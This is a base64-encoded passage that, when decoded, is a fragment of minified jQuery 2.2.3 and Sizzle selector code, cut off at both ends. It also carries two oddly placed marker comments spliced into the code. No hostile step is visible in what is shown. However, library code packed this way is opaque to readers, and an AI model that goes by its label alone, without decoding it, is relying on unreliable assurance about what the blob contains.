c1siKiJdJiZpKCIqIil9ZnVuY3Rpb24gQihlLHQpe3ZhciBuLHIsaT1jZS5hamF4U2V0dGluZ3MuZmxhdE9wdGlvbnN8fHt9O2ZvcihuIGluIHQpdm9pZCAwIT09dFtuXSYmKChpW25dP2U6cnx8KHI9e30pKVtuXT10W25dKTtyZXR1cm4gciYmY2UuZXh0ZW5kKCEwLGUsciksZX1mdW5jdGlvbiBWKGUsdCxuKXtmb3IodmFyIHIsaSxzLG8sYT1lLmNvbnRlbnRzLHU9ZS5kYXRhVHlwZXM7IioiPT09dVswXTspdS5zaGlmdCgpLHZvaWQgMD09PXImJihyPWUubWltZVR5cGV8fHQuZ2V0UmVzcG9uc2VIZWFkZXIoIkNvbnRlbnQtVHlwZSIpKTtpZihyKWZvcihpIGluIGEpaWYoYVtpXSYmYVtpXS50ZXN0KHIpKXt1LnVuc2hpZnQoaSk7YnJlYWt9aWYodVswXWluIG4pcz11WzBdO2Vsc2V7Zm9yKGkgaW4gbil7aWYoIXVbMF18fGUuY29udmVydGVyc1tpKyIgIit1WzBdXSl7cz1pO2JyZWFrfW98fChvPWkpfXM9c3x8b31yZXR1cm4gcz8ocyE9PXVbMF0mJnUudW5zaGlmdChzKSxuW3NdKTp2b2lkIDB9ZnVuY3Rpb24gRyhlLHQsbixyKXt2YXIgaSxzLG8sYSx1LGM9e30sbD1lLmRhdGFUeXBlcy5zbGljZSgpO2lmKGxbMV0pZm9yKG8gaW4gZS5jb252ZXJ0ZXJzKWNbby50b0xvd2VyQ2FzZSgpXT1lLmNvbnZlcnRlcnNbb107Zm9yKHM9bC5zaGlmdCgpO3M7KWlmKGUucmVzcG9uc2VGaWVsZHNbc10mJihuW2UucmVzcG9uc2VGaWVsZHNbc11dPXQpLCF1JiZyJiZlLmRhdGFGaWx0ZXImJih0PWUuZGF0YUZpbHRlcih0LGUuZGF0YVR5cGUpKSx1PXMscz1sLnNoaWZ0KCkpaWYoIioiPT09cylzPXU7ZWxzZSBpZigiKiIhPT11JiZ1IT09cyl7aWYobz1jW3UrIiAiK3NdfHxjWyIqICIrc10sIW8pZm9yKGkgaW4gYylpZihhPWkuc3BsaXQoIiAiKSxhWzFdPT09cyYmKG89Y1t1KyIgIithWzBdXXx8Y1siKiAiK2FbMF1dKSl7bz09PSEwP289Y1tpXTpjW2ldIT09ITAmJihzPWFbMF0sbC51bnNoaWZ0KGFbMV0pKTticmVha31pZihvIT09ITApaWYobyYmZVsidGhyb3dzIl0pdD1vKHQpO2Vsc2UgdHJ5e3Q9byh0KX1jYXRjaChkKXtyZXR1cm57c3RhdGU6InBhcnNlcmVycm9yIixlcnJvcjpvP2Q6Ik5vIGNvbnZlcnNpb24gZnJvbSAiK3UrIiB0byAiK3N9fX1yZXR1cm57c3RhdGU6InN1Y2Nlc3MiLGRhdGE6dH19ZnVuY3Rpb24gWChlLHQsbixyKXt2YXIgaTtpZihjZS5pc0FycmF5KHQpKWNlLmVhY2godCxmdW5jdGlvbih0LGkpe258fEZ0LnRlc3QoZSk/cihlLGkpOlgoZSsiWyIrKCJvYmplY3QiPT10eXBlb2YgaSYmbnVsbCE9aT90OiIiKSsiXSIsaSxuLHIpfSk7ZWxzZSBpZihufHwib2JqZWN0IiE9PWNlLnR5cGUodCkpcihlLHQpO2Vsc2UgZm9yKGkgaW4gdClYKGUrIlsiK2krIl0iLHRbaV0sbixyKX1mdW5jdGlvbiBRKGUpe3JldHVybiBjZS5pc1dpbmRvdyhlKT9lOjk9PT1lLm5vZGVUeXBlJiZlLmRlZmF1bHRWaWV3fXZhciBLPVtdLFo9bi5kb2N1bWVudCxlZT1LLnNsaWNlLHRlPUsuY29uY2F0LG5lPUsucHVzaCxyZT1LLmluZGV4T2YsaWU9e30sc2U9aWUudG9TdHJpbmcsb2U9aWUuaGFzT3duUHJvcGVydHksYWU9e30sdWU9IjIuMi4zIixjZT1mdW5jdGlvbihlLHQpe3JldHVybiBuZXcgY2UuZm4uaW5pdChlLHQpfSxsZT0vXltcc1x1RkVGRlx4QTBdK3xbXHNcdUZFRkZceEEwXSskL2csZGU9L14tbXMtLyxoZT0vLShbXGRhLXpdKS9naSxmZT1mdW5jdGlvbihlLHQpe3JldHVybiB0LnRvVXBwZXJDYXNlKCl9O2NlLmZuPWNlLnByb3RvdHlwZT17anF1ZXJ5OnVlLGNvbnN0cnVjdG9yOmNlLHNlbGVjdG9yOiIiLGxlbmd0aDowLHRvQXJyYXk6ZnVuY3Rpb24oKXtyZXR1cm4gZWUuY2FsbCh0aGlzKX0sZ2V0OmZ1bmN0aW9uKGUpe3JldHVybiBudWxsIT1lPzA+ZT90aGlzW2UrdGhpcy5sZW5ndGhdOnRoaXNbZV06ZWUuY2FsbCh0aGlzKX0scHVzaFN0YWNrOmZ1bmN0aW9uKGUpe3ZhciB0PWNlLm1lcmdlKHRoaXMuY29uc3RydWN0b3IoKSxlKTtyZXR1cm4gdC5wcmV2T2JqZWN0PXRoaXMsdC5jb250ZXh0PXRoaXMuY29udGV4dCx0fSxlYWNoOmZ1bmN0aW9uKGUpe3JldHVybiBjZS5lYWNoKHRoaXMsZSl9LG1hcDpmdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5wdXNoU3RhY2soY2UubWFwKHRoaXMsZnVuY3Rpb24odCxuKXtyZXR1cm4gZS5jYWxsKHQsbix0KX0pKX0sc2xpY2U6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5wdXNoU3RhY2soZWUuYXBwbHkodGhpcyxhcmd1bWVudHMpKX0sZmlyc3Q6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5lcSgwKX0sbGFzdDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmVxKC0xKX0sZXE6ZnVuY3Rpb24oZSl7dmFyIHQ9dGhpcy5sZW5ndGgsbj0rZSsoMD5lP3Q6MCk7cmV0dXJuIHRoaXMucHVzaFN0YWNrKG4+PTAmJnQ+bj9bdGhpc1tuXV06W10pfSxlbmQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5wcmV2T2JqZWN0fHx0aGlzLmNvbnN0cnVjdG9yKCl9LHB1c2g6bmUsc29ydDpLLnNvcnQsc3BsaWNlOksuc3BsaWNlfSxjZS5leHRlbmQ9Y2UuZm4uZXh0ZW5kPWZ1bmN0aW9uKCl7dmFyIGUsdCxuLHIsaSxzLG89YXJndW1lbnRzWzBdfHx7fSxhPTEsdT1hcmd1bWVudHMubGVuZ3RoLGM9ITE7Zm9yKCJib29sZWFuIj09dHlwZW9mIG8mJihjPW8sbz1hcmd1bWVudHNbYV18fHt9LGErKyksIm9iamVjdCI9PXR5cGVvZiBvfHxjZS5pc0Z1bmN0aW9uKG8pfHwobz17fSksYT09PXUmJihvPXRoaXMsYS0tKTt1PmE7YSsrKWlmKG51bGwhPShlPWFyZ3VtZW50c1thXSkpZm9yKHQgaW4gZSluPW9bdF0scj1lW3RdLG8hPT1yJiYoYyYmciYmKGNlLmlzUGxhaW5PYmplY3Qocil8fChpPWNlLmlzQXJyYXkocikpKT8oaT8oaT0hMSxzPW4mJmNlLmlzQXJyYXkobik/bjpbXSk6cz1uJiZjZS5pc1BsYWluT2JqZWN0KG4pP246e30sb1t0XT1jZS5leHRlbmQoYyxzLHIpKTp2b2lkIDAhPT1yJiYob1t0XT1yKSk7cmV0dXJuIG99LGNlLmV4dGVuZCh7ZXhwYW5kbzoialF1ZXJ5IisodWUrTWF0aC5yYW5kb20oKSkucmVwbGFjZSgvXEQvZywiIiksaXNSZWFkeTohMCxlcnJvcjpmdW5jdGlvbihlKXt0aHJvdyBuZXcgRXJyb3IoZSl9LG5vb3A6ZnVuY3Rpb24oKXt9LGlzRnVuY3Rpb246ZnVuY3Rpb24oZSl7cmV0dXJuImZ1bmN0aW9uIj09PWNlLnR5cGUoZSl9LGlzQXJyYXk6QXJyYXkuaXNBcnJheSxpc1dpbmRvdzpmdW5jdGlvbihlKXtyZXR1cm4gbnVsbCE9ZSYmZT09PWUud2luZG93fSxpc051bWVyaWM6ZnVuY3Rpb24oZSl7dmFyIHQ9ZSYmZS50b1N0cmluZygpO3JldHVybiFjZS5pc0FycmF5KGUpJiZ0LXBhcnNlRmxvYXQodCkrMT49MH0saXNQbGFpbk9iamVjdDpmdW5jdGlvbihlKXt2YXIgdDtpZigib2JqZWN0IiE9PWNlLnR5cGUoZSl8fGUubm9kZVR5cGV8fGNlLmlzV2luZG93KGUpKXJldHVybiExO2lmKGUuY29uc3RydWN0b3ImJiFvZS5jYWxsKGUsImNvbnN0cnVjdG9yIikmJiFvZS5jYWxsKGUuY29uc3RydWN0b3IucHJvdG90eXBlfHx7fSwiaXNQcm90b3R5cGVPZiIpKXJldHVybiExO2Zvcih0IGluIGUpO3JldHVybiB2b2lkIDA9PT10fHxvZS5jYWxsKGUsdCl9LGlzRW1wdHlPYmplY3Q6ZnVuY3Rpb24oZSl7dmFyIHQ7Zm9yKHQgaW4gZSlyZXR1cm4hMTtyZXR1cm4hMH0sdHlwZTpmdW5jdGlvbihlKXtyZXR1cm4gbnVsbD09ZT9lKyIiOiJvYmplY3QiPT10eXBlb2YgZXx8ImZ1bmN0aW9uIj09dHlwZW9mIGU/aWVbc2UuY2FsbChlKV18fCJvYmplY3QiOnR5cGVvZiBlfSxnbG9iYWxFdmFsOmZ1bmN0aW9uKGUpe3ZhciB0LG49ZXZhbDtlPWNlLnRyaW0oZSksZSYmKDE9PT1lLmluZGV4T2YoInVzZSBzdHJpY3QiKT8odD1aLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpLHQudGV4dD1lLFouaGVhZC5hcHBlbmRDaGlsZCh0KS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHQpKTpuKGUpKX0sY2FtZWxDYXNlOmZ1bmN0aW9uKGUpe3JldHVybiBlLnJlcGxhY2UoZGUsIm1zLSIpLnJlcGxhY2UoaGUsZmUpfSxub2RlTmFtZTpmdW5jdGlvbihlLHQpe3JldHVybiBlLm5vZGVOYW1lJiZlLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk9PT10LnRvTG93ZXJDYXNlKCl9LGVhY2g6ZnVuY3Rpb24oZSx0KXt2YXIgbixyPTA7aWYobyhlKSlmb3Iobj1lLmxlbmd0aDtuPnImJnQuY2FsbChlW3JdLHIsZVtyXSkhPT0hMTtyKyspO2Vsc2UgZm9yKHIgaW4gZSlpZih0LmNhbGwoZVtyXSxyLGVbcl0pPT09ITEpYnJlYWs7cmV0dXJuIGV9LHRyaW06ZnVuY3Rpb24oZSl7cmV0dXJuIG51bGw9PWU/IiI6KGUrIiIpLnJlcGxhY2UobGUsIiIpfSxtYWtlQXJyYXk6ZnVuY3Rpb24oZSx0KXt2YXIgbj10fHxbXTtyZXR1cm4gbnVsbCE9ZSYmKG8oT2JqZWN0KGUpKT9jZS5tZXJnZShuLCJzdHJpbmciPT10eXBlb2YgZT9bZV06ZSk6bmUuY2FsbChuLGUpKSxufSxpbkFycmF5OmZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gbnVsbD09dD8tMTpyZS5jYWxsKHQsZSxuKX0sbWVyZ2U6ZnVuY3Rpb24oZSx0KXtmb3IodmFyIG49K3QubGVuZ3RoLHI9MCxpPWUubGVuZ3RoO24+cjtyKyspZVtpKytdPXRbcl07cmV0dXJuIGUubGVuZ3RoPWksZX0sZ3JlcDpmdW5jdGlvbihlLHQsbil7Zm9yKHZhciByLGk9W10scz0wLG89ZS5sZW5ndGgsYT0hbjtvPnM7cysrKXI9IXQoZVtzXSxzKSxyIT09YSYmaS5wdXNoKGVbc10pO3JldHVybiBpfSxtYXA6ZnVuY3Rpb24oZSx0LG4pe3ZhciByLGkscz0wLGE9W107aWYobyhlKSlmb3Iocj1lLmxlbmd0aDtyPnM7cysrKWk9dChlW3NdLHMsbiksbnVsbCE9aSYmYS5wdXNoKGkpO2Vsc2UgZm9yKHMgaW4gZSlpPXQoZVtzXSxzLG4pLG51bGwhPWkmJmEucHVzaChpKTtyZXR1cm4gdGUuYXBwbHkoW10sYSl9LGd1aWQ6MSxwcm94eTpmdW5jdGlvbihlLHQpe3ZhciBuLHIsaTtyZXR1cm4ic3RyaW5nIj09dHlwZW9mIHQmJihuPWVbdF0sdD1lLGU9biksY2UuaXNGdW5jdGlvbihlKT8ocj1lZS5jYWxsKGFyZ3VtZW50cywyKSxpPWZ1bmN0aW9uKCl7cmV0dXJuIGUuYXBwbHkodHx8dGhpcyxyLmNvbmNhdChlZS5jYWxsKGFyZ3VtZW50cykpKX0saS5ndWlkPWUuZ3VpZD1lLmd1aWR8fGNlLmd1aWQrKyxpKTp2b2lkIDB9LG5vdzpEYXRlLm5vdyxzdXBwb3J0OmFlfSksImZ1bmN0aW9uIj09dHlwZW9mIFN5bWJvbCYmKGNlLmZuW1N5bWJvbC5pdGVyYXRvcl09S1tTeW1ib2wuaXRlcmF0b3JdKSxjZS5lYWNoKCJCb29sZWFuIE51bWJlciBTdHJpbmcgRnVuY3Rpb24gQXJyYXkgRGF0ZSBSZWdFeHAgT2JqZWN0IEVycm9yIFN5bWJvbCIuc3BsaXQoIiAiKSxmdW5jdGlvbihlLHQpe2llWyJbb2JqZWN0ICIrdCsiXSJdPXQudG9Mb3dlckNhc2UoKX0pO3ZhciBwZT0NCi8qIGpRdWVyeSB2Mi4yLjMgLS0+ICovDQoNCi8qIDwhLS0gTW9yZSBqUXVlcnkgKGFuZCBwcm9icmFibHkgU2l6emxlLmpzIHYyLjIuMSkgKi8NCmZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQoZSx0LG4scil7dmFyIGkscyxvLGEsdSxjLGQsZixwPXQmJnQub3duZXJEb2N1bWVudCxfPXQ/dC5ub2RlVHlwZTo5O2lmKG49bnx8W10sInN0cmluZyIhPXR5cGVvZiBlfHwhZXx8MSE9PV8mJjkhPT1fJiYxMSE9PV8pcmV0dXJuIG47aWYoIXImJigodD90Lm93bmVyRG9jdW1lbnR8fHQ6SSkhPT1QJiZIKHQpLHQ9dHx8UCxGKSl7aWYoMTEhPT1fJiYoYz15ZS5leGVjKGUpKSlpZihpPWNbMV0pe2lmKDk9PT1fKXtpZighKG89dC5nZXRFbGVtZW50QnlJZChpKSkpcmV0dXJuIG47aWYoby5pZD09PWkpcmV0dXJuIG4ucHVzaChvKSxufWVsc2UgaWYocCYmKG89cC5nZXRFbGVtZW50QnlJZChpKSkmJlIodCxvKSYmby5pZD09PWkpcmV0dXJuIG4ucHVzaChvKSxufWVsc2V7aWYoY1syXSlyZXR1cm4gSy5hcHBseShuLHQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoZSkpLG47aWYoKGk9Y1szXSkmJk0uZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSYmdC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKXJldHVybiBLLmFwcGx5KG4sdC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKGkpKSxufWlmKE0ucXNhJiYhSltlKyIgIl0mJighQ3x8IUMudGVzdChlKSkpe2lmKDEhPT1fKXA9dCxmPWU7ZWxzZSBpZigib2JqZWN0IiE9PXQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSl7Zm9yKChhPXQuZ2V0QXR0cmlidXRlKCJpZCIpKT9hPWEucmVwbGFjZSh2ZSwiXFwkJiIpOnQuc2V0QXR0cmlidXRlKCJpZCIsYT1OKSxkPVQoZSkscz1kLmxlbmd0aCx1PWhlLnRlc3QoYSk/IiMiK2E6IltpZD0nIithKyInXSI7cy0tOylkW3NdPXUrIiAiK2goZFtzXSk7Zj1kLmpvaW4oIiwiKSxwPWdlLnRlc3QoZSkmJmwodC5wYXJlbnROb2RlKXx8dH1pZihmKXRyeXtyZXR1cm4gSy5hcHBseShuLHAucXVlcnlTZWxlY3RvckFsbChmKSksbn1jYXRjaChtKXt9ZmluYWxseXthPT09TiYmdC5yZW1vdmVBdHRyaWJ1dGUoImlkIil9fX1yZXR1cm4gRChlLnJlcGxhY2UoYWUsIiQxIiksdCxuLHIpfWZ1bmN0aW9uIG4oKXtmdW5jdGlvbiBlKG4scil7cmV0dXJuIHQucHVzaChuKyIgIik+TC5jYWNoZUxlbmd0aCYmZGVsZXRlIGVbdC5zaGlmdCgpXSxlW24rIiAiXT1yfXZhciB0PVtdO3JldHVybiBlfWZ1bmN0aW9uIHIoZSl7cmV0dXJuIGVbTl09ITAsZX1mdW5jdGlvbiBpKGUpe3ZhciB0PVAuY3JlYXRlRWxlbWVudCgiZGl2Iik7dHJ5e3JldHVybiEhZSh0KX1jYXRjaChuKXtyZXR1cm4hMX1maW5hbGx5e3QucGFyZW50Tm9kZSYmdC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHQpLHQ9bnVsbH19ZnVuY3Rpb24gcyhlLHQpe2Zvcih2YXIgbj1lLnNwbGl0KCJ8Iikscj1uLmxlbmd0aDtyLS07KUwuYXR0ckhhbmRsZVtuW3JdXT10fWZ1bmN0aW9uIG8oZSx0KXt2YXIgbj10JiZlLHI9biYmMT09PWUubm9kZVR5cGUmJjE9PT10Lm5vZGVUeXBlJiYofnQuc291cmNlSW5kZXh8fEIpLSh+ZS5zb3VyY2VJbmRleHx8Qik7aWYocilyZXR1cm4gcjtpZihuKWZvcig7bj1uLm5leHRTaWJsaW5nOylpZihuPT09dClyZXR1cm4tMTtyZXR1cm4gZT8xOi0xfWZ1bmN0aW9uIGEoZSl7cmV0dXJuIGZ1bmN0aW9uKHQpe3ZhciBuPXQubm9kZU5hbWUudG9Mb3dlckNhc2UoKTtyZXR1cm4iaW5wdXQiPT09biYmdC50eXBlPT09ZX19ZnVuY3Rpb24gdShlKXtyZXR1cm4gZnVuY3Rpb24odCl7dmFyIG49dC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpO3JldHVybigiaW5wdXQiPT09bnx8ImJ1dHRvbiI9PT1uKSYmdC50eXBlPT09ZX19ZnVuY3Rpb24gYyhlKXtyZXR1cm4gcihmdW5jdGlvbih0KXtyZXR1cm4gdD0rdCxyKGZ1bmN0aW9uKG4scil7Zm9yKHZhciBpLHM9ZShbXSxuLmxlbmd0aCx0KSxvPXMubGVuZ3RoO28tLTspbltpPXNbb11dJiYobltpXT0hKHJbaV09bltpXSkpfSl9KX1mdW5jdGlvbiBsKGUpe3JldHVybiBlJiYidW5kZWZpbmVkIiE9dHlwZW9mIGUuZ2V0RWxlbWVudHNCeVRhZ05hbWUmJmV9ZnVuY3Rpb24gZCgpe31mdW5jdGlvbiBoKGUpe2Zvcih2YXIgdD0wLG49ZS5sZW5ndGgscj0iIjtuPnQ7dCsrKXIrPWVbdF0udmFsdWU7cmV0dXJuIHJ9ZnVuY3Rpb24gZihlLHQsbil7dmFyIHI9dC5kaXIsaT1uJiYicGFyZW50Tm9kZSI9PT1yLHM9VSsrO3JldHVybiB0LmZpcnN0P2Z1bmN0aW9uKHQsbixzKXtmb3IoO3Q9dFtyXTspaWYoMT09PXQubm9kZVR5cGV8fGkpcmV0dXJuIGUodCxuLHMpfTpmdW5jdGlvbih0LG4sbyl7dmFyIGEsdSxjLGw9W1csc107aWYobyl7Zm9yKDt0PXRbcl07KWlmKCgxPT09dC5ub2RlVHlwZXx8aSkmJmUodCxuLG8pKXJldHVybiEwfWVsc2UgZm9yKDt0PXRbcl07KWlmKDE9PT10Lm5vZGVUeXBlfHxpKXtpZihjPXRbTl18fCh0W05dPXt9KSx1PWNbdC51bmlxdWVJRF18fChjW3QudW5pcXVlSURdPXt9KSwoYT11W3JdKSYmYVswXT09PVcmJmFbMV09PT1zKXJldHVybiBsWzJdPWFbMl07aWYodVtyXT1sLGxbMl09ZSh0LG4sbykpcmV0dXJuITB9fX1mdW5jdGlvbiBwKGUpe3JldHVybiBlLmxlbmd0aD4xP2Z1bmN0aW9uKHQsbixyKXtmb3IodmFyIGk9ZS5sZW5ndGg7aS0tOylpZighZVtpXSh0LG4scikpcmV0dXJuITE7cmV0dXJuITB9OmVbMF19ZnVuY3Rpb24gXyhlLG4scil7Zm9yKHZhciBpPTAscz1uLmxlbmd0aDtzPmk7aSsrKXQoZSxuW2ldLHIpO3JldHVybiByfWZ1bmN0aW9uIG0oZSx0LG4scixpKXtmb3IodmFyIHMsbz1bXSxhPTAsdT1lLmxlbmd0aCxjPW51bGwhPXQ7dT5hO2ErKykocz1lW2FdKSYmKG4mJiFuKHMscixpKXx8KG8ucHVzaChzKSxjJiZ0LnB1c2goYSkpKTtyZXR1cm4gb31mdW5jdGlvbiB5KGUsdCxuLGkscyxvKXtyZXR1cm4gaSYmIWlbTl0mJihpPXkoaSkpLHMmJiFzW05dJiYocz15KHMsbykpLHIoZnVuY3Rpb24ocixvLGEsdSl7dmFyIGMsbCxkLGg9W10sZj1bXSxwPW8ubGVuZ3RoLHk9cnx8Xyh0fHwiKiIsYS5ub2RlVHlwZT9bYV06YSxbXSksZz0hZXx8IXImJnQ/eTptKHksaCxlLGEsdSksdj1uP3N8fChyP2U6cHx8aSk/W106bzpnO2lmKG4mJm4oZyx2LGEsdSksaSlmb3IoYz1tKHYsZiksaShjLFtdLGEsdSksbD1jLmxlbmd0aDtsLS07KShkPWNbbF0pJiYodltmW2xdXT0hKGdbZltsXV09ZCkpO2lmKHIpe2lmKHN8fGUpe2lmKHMpe2ZvcihjPVtdLGw9di5sZW5ndGg7bC0tOykoZD12W2xdKSYmYy5wdXNoKGdbbF09ZCk7cyhudWxsLHY9W10sYyx1KX1mb3IobD12Lmxlbmd0aDtsLS07KShkPXZbbF0pJiYoYz1zP2VlKHIsZCk6aFtsXSk+LTEmJihyW2NdPSEob1tjXT1kKSl9fWVsc2Ugdj1tKHY9PT1vP3Yuc3BsaWNlKHAsdi5sZW5ndGgpOnYpLHM/cyhudWxsLG8sdix1KTpLLmFwcGx5KG8sdil9KX1mdW5jdGlvbiBnKGUpe2Zvcih2YXIgdCxuLHIsaT1lLmxlbmd0aCxzPUwucmVsYXRpdmVbZVswXS50eXBlXSxvPXN8fEwucmVsYXRpdmVbIiAiXSxhPXM/MTowLHU9ZihmdW5jdGlvbihlKXtyZXR1cm4gZT09PXR9LG8sITApLGM9ZihmdW5jdGlvbihlKXtyZXR1cm4gZWUodCxlKT4tMX0sbywhMCksbD1bZnVuY3Rpb24oZSxuLHIpe3ZhciBpPSFzJiYocnx8biE9PVMpfHwoKHQ9bikubm9kZVR5cGU/dShlLG4scik6YyhlLG4scikpO3JldHVybiB0PW51bGwsaX1dO2k+YTthKyspaWYobj1MLnJlbGF0aXZlW2VbYV0udHlwZV0pbD1bZihwKGwpLG4pXTtlbHNle2lmKG49TC5maWx0ZXJbZVthXS50eXBlXS5hcHBseShudWxsLGVbYV0ubWF0Y2hlcyksbltOXSl7Zm9yKHI9KythO2k+ciYmIUwucmVsYXRpdmVbZVtyXS50eXBlXTtyKyspO3JldHVybiB5KGE+MSYmcChsKSxhPjEmJmgoZS5zbGljZSgwLGEtMSkuY29uY2F0KHt2YWx1ZToiICI9PT1lW2EtMl0udHlwZT8iKiI6IiJ9KSkucmVwbGFjZShhZSwiJDEiKSxuLHI+YSYmZyhlLnNsaWNlKGEscikpLGk+ciYmZyhlPWUuc2xpY2UocikpLGk+ciYmaChlKSl9bC5wdXNoKG4pfXJldHVybiBwKGwpfWZ1bmN0aW9uIHYoZSxuKXt2YXIgaT1uLmxlbmd0aD4wLHM9ZS5sZW5ndGg+MCxvPWZ1bmN0aW9uKHIsbyxhLHUsYyl7dmFyIGwsZCxoLGY9MCxwPSIwIixfPXImJltdLHk9W10sZz1TLHY9cnx8cyYmTC5maW5kLlRBRygiKiIsYyksYj1XKz1udWxsPT1nPzE6TWF0aC5yYW5kb20oKXx8LjEsTT12Lmxlbmd0aDtmb3IoYyYmKFM9bz09PVB8fG98fGMpO3AhPT1NJiZudWxsIT0obD12W3BdKTtwKyspe2lmKHMmJmwpe2ZvcihkPTAsb3x8bC5vd25lckRvY3VtZW50PT09UHx8KEgobCksYT0hRik7aD1lW2QrK107KWlmKGgobCxvfHxQLGEpKXt1LnB1c2gobCk7YnJlYWt9YyYmKFc9Yil9aSYmKChsPSFoJiZsKSYmZi0tLHImJl8ucHVzaChsKSl9aWYoZis9cCxpJiZwIT09Zil7Zm9yKGQ9MDtoPW5bZCsrXTspaChfLHksbyxhKTtpZihyKXtpZihmPjApZm9yKDtwLS07KV9bcF18fHlbcF18fCh5W3BdPVguY2FsbCh1KSk7eT1tKHkpfUsuYXBwbHkodSx5KSxjJiYhciYmeS5sZW5ndGg+MCYmZituLmxlbmd0aD4xJiZ0LnVuaXF1ZVNvcnQodSl9cmV0dXJuIGMmJihXPWIsUz1nKSxffTtyZXR1cm4gaT9yKG8pOm99dmFyIGIsTSxMLGssdyxULFksRCxTLHgsaixILFAsRSxGLEMsQSxPLFIsTj0ic2l6emxlIisxKm5ldyBEYXRlLEk9ZS5kb2N1bWVudCxXPTAsVT0wLHo9bigpLHE9bigpLEo9bigpLCQ9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZT09PXQmJihqPSEwKSwwfSxCPTE8PDMxLFY9e30uaGFzT3duUHJvcGVydHksRz1bXSxYPUcucG9wLFE9Ry5wdXNoLEs9Ry5wdXNoLFo9Ry5zbGljZSxlZT1mdW5jdGlvbihlLHQpe2Zvcih2YXIgbj0wLHI9ZS5sZW5ndGg7cj5uO24rKylpZihlW25dPT09dClyZXR1cm4gbjtyZXR1cm4tMX0sdGU9ImNoZWNrZWR8c2VsZWN0ZWR8YXN5bmN8YXV0b2ZvY3VzfGF1dG9wbGF5fGNvbnRyb2xzfGRlZmVyfGRpc2FibGVkfGhpZGRlbnxpc21hcHxsb29wfG11bHRpcGxlfG9wZW58cmVhZG9ubHl8cmVxdWlyZWR8c2NvcGVkIixuZT0iW1xceDIwXFx0XFxyXFxuXFxmXSIscmU9Iig/OlxcXFwufFtcXHctXXxbXlxceDAwLVxceGEwXSkrIixpZT0iXFxbIituZSsiKigiK3JlKyIpKD86IituZSsiKihbKl4kfCF+XT89KSIrbmUrIiooPzonKCg/OlxcXFwufFteXFxcXCddKSopJ3xcIigoPzpcXFxcLnxbXlxcXFxcIl0pKilcInwoIityZSsiKSl8KSIrbmUrIipcXF0iLHNlPSI6KCIrcmUrIikoPzpcXCgoKCcoKD86XFxcXC58W15cXFxcJ10pKiknfFwiKCg/OlxcXFwufFteXFxcXFwiXSkqKVwiKXwoKD86XFxcXC58W15cXFxcKClbXFxdXXwiK2llKyIpKil8LiopXFwpfCkiLG9lPW5ldyBSZWdFeHAobmUrIisiLCJnIiksYWU9bmV3IFJlZ0V4cCgiXiIrbmUrIit8KCg/Ol58W15cXFxcXSkoPzpcXFxcLikqKSIrbmUrIiskIiwiZyIpLHVlPW5ldyBSZWdFeHAoIl4iK25lKyIqLCIrbmUrIioiKSxjZT1uZXcgUmVnRXhwKCJeIituZSsiKihbPit+XXwiK25lKyIpIituZSsiKiIpLGxlPW5ldyBSZWdFeHAoIj0iK25lKyIqKFteXFxdJ1wiXSo/KSIrbmUrIipcXF0iLCJnIiksZGU9bmV3IFJlZ0V4cChzZSksaGU9bmV3IFJlZ0V4cCgiXiIrcmUrIiQiKSxmZT17SUQ6bmV3IFJlZ0V4cCgiXiMoIityZSsiKSIpLENMQVNTOm5ldyBSZWdFeHAoIl5cXC4oIityZSsiKSIpLFRBRzpuZXcgUmVnRXhwKCJeKCIrcmUrInxbKl0pIiksQVRUUjpuZXcgUmVnRXhwKCJeIitpZSksUFNFVURPOm5ldyBSZWdFeHAoIl4iK3NlKSxDSElMRDpuZXcgUmVnRXhwKCJeOihvbmx5fGZpcnN0fGxhc3R8bnRofG50aC1sYXN0KS0oY2hpbGR8b2YtdHlwZSkoPzpcXCgiK25lKyIqKGV2ZW58b2RkfCgoWystXXwpKFxcZCopbnwpIituZSsiKig/OihbKy1dfCkiK25lKyIqKFxcZCspfCkpIituZSsiKlxcKXwpIiwiaSIpLGJvb2w6bmV3IFJlZ0V4cCgiXig/OiIrdGUrIikkIiwiaSIpLG5lZWRzQ29udGV4dDpuZXcgUmVnRXhwKCJeIituZSsiKls+K35dfDooZXZlbnxvZGR8ZXF8Z3R8bHR8bnRofGZpcnN0fGxhc3QpKD86XFwoIituZSsiKigoPzotXFxkKT9cXGQqKSIrbmUrIipcXCl8KSg/PVteLV18JCkiLCJpIil9LHBlPS9eKD86aW5wdXR8c2VsZWN0fHRleHRhcmVhfGJ1dHRvbikkL2ksX2U9L15oXGQkL2ksbWU9L15bXntdK1x7XHMqXFtuYXRpdmUgXHcvLHllPS9eKD86IyhbXHctXSspfChcdyspfFwuKFtcdy1dKykpJC8sZ2U9L1srfl0vLHZlPS8nfFxcL2csYmU9bmV3IFJlZ0V4cCgiXFxcXChbXFxkYS1mXXsxLDZ9IituZSsiP3woIituZSsiKXwuKSIsImlnIiksTWU9ZnVuY3Rpb24oZSx0LG4pe3ZhciByPSIweCIrdC02NTUzNjtyZXR1cm4gciE9PXJ8fG4/dDowPnI/U3RyaW5nLmZyb21DaGFyQ29kZShyKzY1NTM2KTpTdHJpbmcuZnJvbUNoYXJDb2RlKHI+PjEwfDU1Mjk2LDEwMjMmcnw1NjMyMCl9LExlPWZ1bmN0aW9uKCl7SCgpfTt0cnl7Sy5hcHBseShHPVouY2FsbChJLmNoaWxkTm9kZXMpLEkuY2hpbGROb2RlcyksR1tJLmNoaWxkTm9kZXMubGVuZ3RoXS5ub2RlVHlwZX1jYXRjaChrZSl7Sz17YXBwbHk6Ry5sZW5ndGg/ZnVuY3Rpb24oZSx0KXtRLmFwcGx5KGUsWi5jYWxsKHQpKX06ZnVuY3Rpb24oZSx0KXtmb3IodmFyIG49ZS5sZW5ndGgscj0wO2VbbisrXT10W3IrK107KTtlLmx